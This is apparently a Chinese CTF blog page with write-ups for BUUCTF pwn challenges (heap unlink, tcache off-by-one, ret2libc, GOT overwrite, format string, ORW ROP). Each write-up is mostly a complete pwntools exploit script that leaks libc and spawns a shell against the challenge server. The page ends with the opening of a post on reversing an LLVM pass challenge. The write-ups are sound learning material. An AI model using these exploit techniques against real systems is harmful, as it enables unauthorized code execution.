<h1 id="buu073-hitcontraining_bamboobox"><a class="markdownIt-Anchor" href="#buu073-hitcontraining_bamboobox"></a> buu073-hitcontraining_bamboobox</h1>
<p>数据结构：<br />
<img src="https://img-blog.csdnimg.cn/d99f16a105794f47aec93a1ea9a3db5f.png" alt="" /><br />
共可申请100个结构，其中change_item函数有任意长度堆溢出漏洞。<br />
<img src="https://img-blog.csdnimg.cn/72907531dc174ac0a71c3acee836b772.png" alt="在这里插入图片描述" /><br />
本题程序加载地址固定，itemlist地址固定，因此考虑使用unlink方法解题。<br />
<img src="https://img-blog.csdnimg.cn/d858dce877a145c588d755fa3719a302.png" alt="在这里插入图片描述" /><br />
unlink之后可以直接通过第一个chunk读取到stdin的地址，从而获取libc加载基址。<br />
需要注意的是这里修改的是atoi函数的got表地址，如果修改free函数的got表地址，由于输入时程序会将输入的后面一个字节清零，会导致free函数got表后面的一个地址（puts）发生错误，使得menu函数调用puts函数失败。而atoi后面是exit函数地址，无关紧要。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29731</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Please enter the name of item:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index, length, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Please enter the new name of the item:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">b&#x27;colin&#x27;</span>)     <span class="comment"># chunk #0</span></span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">b&#x27;colin&#x27;</span>)     <span class="comment"># chunk #1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)   <span class="comment"># chunk #2</span></span><br><span class="line">payload = p64(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x81</span>)</span><br><span class="line">payload += p64(<span class="number">0x6020C8</span> - <span class="number">0x18</span>)</span><br><span class="line">payload += p64(<span class="number">0x6020C8</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += cyclic(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(<span class="number">0x80</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x90</span>, payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show()</span><br><span class="line">io.recv(<span class="number">4</span>)</span><br><span class="line">stdin = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stdin))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>, stdin)</span><br><span class="line">base = stdin - libc.dump(<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span>, p64(stdin) + p64(<span class="number">0</span>) + p64(<span class="number">0x88</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x8</span>, p64(sys))</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu074-cmcc_pwnme2"><a class="markdownIt-Anchor" href="#buu074-cmcc_pwnme2"></a> buu074-cmcc_pwnme2</h1>
<p>简单的栈溢出，题目给的拼接字符串的函数里面的路径是错的，不需要用，直接输出got表然后get shell即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwnme2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29174</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwnme2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x70</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please input:&#x27;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x70</span>)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please input:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu075-picoctf_2018_got-shell"><a class="markdownIt-Anchor" href="#buu075-picoctf_2018_got-shell"></a> buu075-picoctf_2018_got-shell</h1>
<p>在修改后还调用了puts函数，因此只需要将puts函数的got表内容改成win函数地址即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./PicoCTF_2018_got-shell&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27364</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./PicoCTF_2018_got-shell&#x27;</span>)</span><br><span class="line">target = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">value = elf.symbols[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;value?\n&#x27;</span>, <span class="built_in">hex</span>(target)[<span class="number">2</span>:].encode())</span><br><span class="line">io.sendlineafter(<span class="built_in">hex</span>(target)[<span class="number">2</span>:].encode(), <span class="built_in">hex</span>(value)[<span class="number">2</span>:].encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu076-npuctf_2020_easyheap"><a class="markdownIt-Anchor" href="#buu076-npuctf_2020_easyheap"></a> buu076-npuctf_2020_easyheap</h1>
<p>增删改查四个功能，其中增加只能增加大小为0x20或0x40的堆块。改功能有off by one漏洞。</p>
<p>本题环境是2.27，因此释放的堆块都会在tcache中保存。而要想tcache中的堆块被重新分配，其大小就必须是0x20或0x40。如果使用off by one漏洞修改一个堆块的size，则必须在其正在使用时修改，否则当堆块释放时修改大小，在重新分配时无法通过检查。至于大小的修改，有两种可能：改大或改小。</p>
<p>如果改大，则只能从0x20改为0x40，修改后的大小如果不为0x40，在释放后将无法被重新分配。如果改小，可以从0x40改为0x20，后面的部分由于可以控制，因此可以伪造成一个假chunk。</p>
<p>这里选择的是<font color=red><strong>改大</strong></font>。如何改？首先想象这样的堆排布：三个0x20的chunk，前面2个都是用作buffer，后面一个用于heaparray结构，现在通过edit第1个chunk将第2个chunk的大小改成0x40，再释放第2、3个chunk，就会产生chunk重叠，之后再重新分配回来，就可以通过edit随意修改heaparray中的指针，进而实现任意地址写。本题中最方便的就是改到free的got表位置，通过show获取libc地址，然后将这里的值改成system函数地址，直接delete即可get shell。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&quot;npuctf_2020_easyheap&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29065</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;npuctf_2020_easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	sla(<span class="string">b&#x27;Content:&#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">index, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	sla(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_heap</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_heap</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x18</span>, cyclic(<span class="number">0x38</span>))	<span class="comment"># 0</span></span><br><span class="line">create_heap(<span class="number">0x18</span>, cyclic(<span class="number">0x18</span>))	<span class="comment"># 1</span></span><br><span class="line">create_heap(<span class="number">0x18</span>, cyclic(<span class="number">0x18</span>))	<span class="comment"># 2</span></span><br><span class="line">delete_heap(<span class="number">0</span>)</span><br><span class="line">edit_heap(<span class="number">1</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p8(<span class="number">0x41</span>))</span><br><span class="line">delete_heap(<span class="number">2</span>)</span><br><span class="line">create_heap(<span class="number">0x38</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x38</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">show_heap(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">free = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>, free)</span><br><span class="line">base = free - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">edit_heap(<span class="number">0</span>, p64(system))</span><br><span class="line">delete_heap(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu077-wdb_2018_2nd_easyfmt"><a class="markdownIt-Anchor" href="#buu077-wdb_2018_2nd_easyfmt"></a> buu077-wdb_2018_2nd_easyfmt</h1>
<p>这题在bugku上也有，好像是叫pwn07，简单的格式化字符串漏洞，不多解释了。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29596</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Do you know repeater?\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p32(elf.got[<span class="string">&#x27;read&#x27;</span>]) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">mem_read_addr = u32(io.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, mem_read_addr)</span><br><span class="line">libc_base = mem_read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">mem_sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">mem_printf_addr = libc_base + libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: mem_sys_addr&#125;, write_size = <span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()	<span class="comment"># choose 3rd of libc</span></span><br></pre></td></tr></table></figure>
<h1 id="buu078-picoctf_2018_can-you-gets-me"><a class="markdownIt-Anchor" href="#buu078-picoctf_2018_can-you-gets-me"></a> buu078-PicoCTF_2018_can-you-gets-me</h1>
<p>静态编译的32位程序，没有system函数和字符串/bin/sh，因此通过orw方式读取flag。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./PicoCTF_2018_can-you-gets-me&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27340</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./PicoCTF_2018_can-you-gets-me&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop4 = <span class="number">0x809d6f4</span></span><br><span class="line">write_addr = <span class="number">0x80EBD20</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x18</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(pop4)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(write_addr)</span><br><span class="line">payload += p32(<span class="number">5</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p32(pop4)</span><br><span class="line">payload += p32(write_addr)</span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(pop4)</span><br><span class="line">payload += p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(write_addr)</span><br><span class="line">payload += p32(<span class="number">0x30</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(write_addr)</span><br><span class="line">payload += p32(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;GIVE ME YOUR NAME!&#x27;</span>, payload)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu079-mrctf2020_easy_equation"><a class="markdownIt-Anchor" href="#buu079-mrctf2020_easy_equation"></a> buu079-mrctf2020_easy_equation</h1>
<p>简单的格式化字符串漏洞。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">sol = <span class="number">2</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./mrctf2020_easy_equation&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25629</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./mrctf2020_easy_equation&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># time.sleep(3)</span></span><br><span class="line">payload = <span class="string">b&#x27;a%1c%10$hhnaaaaba&#x27;</span> + p64(<span class="number">0x60105C</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-3/" class="post-title-link" itemprop="url">LLVM pass pwn 入门 (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:20 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:20+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/llvm-pass-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">llvm pass pwn 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这篇文章中我们来分析一下红帽杯2021-simpleVM这道题，由于和上一道题相比这道题相对更加简单些，读者可以在阅读本文之前实操一下，遇到困难时再通过本文找到答案，这样能够更好地提升我们的做题实践能力。（本题的附件可以在Github上找到，在笔者的Github中也有保存）</p>
<h1 id="redhat2021-simplevm"><a class="markdownIt-Anchor" href="#redhat2021-simplevm"></a> RedHat2021-simpleVM</h1>
<p>首先还是使用IDA打开，找到了几个没有名字的函数：</p>
<p><img src="https://img-blog.csdnimg.cn/0c7e9c0c6ac549738b41f87f51f64e3e.png" alt="" /></p>
<h2 id="step-1-找到runonfunction函数"><a class="markdownIt-Anchor" href="#step-1-找到runonfunction函数"></a> Step 1: 找到runOnFunction函数</h2>
<p>如果读者还记得上一篇文章的方法，这一步应该来说不难想到。我们是通过IDA汇编界面中对函数的交叉引用情况进行判断的，如果这个函数没有数据段的交叉引用，那么它一定不是runOnFunction函数，因为这是一个覆写的函数，其地址会被保存到vtable结构体中。根据这种方法，我们可以找到多个函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000006780 sub_6780        proc near               ; CODE XREF: sub_67D0+24↓p</span><br><span class="line">LOAD:0000000000006780                                         ; DATA XREF: LOAD:off_20DD20↓o</span><br><span class="line">...</span><br><span class="line">LOAD:00000000000067D0 sub_67D0        proc near               ; DATA XREF: LOAD:000000000020DD28↓o</span><br><span class="line">...</span><br><span class="line">LOAD:0000000000006830 sub_6830        proc near               ; DATA XREF: LOAD:000000000020DDA8↓o</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/8de573125adf477486aa95b64d9936c6.png" alt="" /><br />
<img src="https://img-blog.csdnimg.cn/680a75cf30a44934a00f56d372fa1c15.png" alt="" /><br />
其中我们打开前两个函数，发现都是一些删除和调用析构函数的操作，因此这一定不是runOnFunction函数的覆写。故runOnFunction应该是sub_6830函数。</p>
